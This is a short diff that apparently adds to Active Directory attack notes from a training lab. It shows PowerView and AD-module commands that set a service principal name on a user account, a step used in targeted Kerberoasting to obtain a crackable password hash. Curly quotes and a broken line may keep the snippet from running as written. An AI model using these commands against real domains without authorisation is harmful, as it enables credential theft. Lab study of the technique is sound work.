@@ -184,3 +184,16 @@ Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select Servi
 ```
 
 
+- Set a SPN for the user (must be unique for the forest)
+
+```powershell
+# Powerview
+Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}
+
+# AD module
+Set-ADUser -Identity support1user -ServicePrincipalNames
+@{Add=‘dcorp/whatever1'}
+```
+
+
+
